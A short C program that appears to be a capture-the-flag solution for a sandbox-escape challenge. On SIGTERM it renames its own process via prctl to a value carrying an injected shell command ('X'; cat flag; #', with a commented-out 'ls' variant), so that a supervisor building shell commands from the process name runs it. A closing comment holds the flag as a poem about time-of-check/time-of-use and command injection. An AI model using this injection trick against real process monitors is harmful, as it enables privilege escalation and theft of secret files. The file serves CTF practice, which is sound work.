#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/prctl.h>

void ignore_handler(int signum) {
    //const char *new_name = "X'; ls; echo 'A";
    const char *new_name = "X'; cat flag; #";
    printf("OK1\n");
    fflush(stdout);
    if (prctl(PR_SET_NAME, new_name, 0, 0, 0) == -1)
    {
        printf("prctl name\n");
        fflush(stdout);
    }
    sleep(10);
    printf("OK2\n");
    fflush(stdout);
}

int main() {
    // Ignore SIGTERM signal
    signal(SIGTERM, ignore_handler);
    sleep(60);
    return 0;
}

/*
FLAG{In a coffin-like sandbox, the hacker confined,
Time-of-check, time-of-use, the moment defined.
Command injection unleashed, a daring advance,
Escape from the digital grave, in a triumphant stance.}
*/
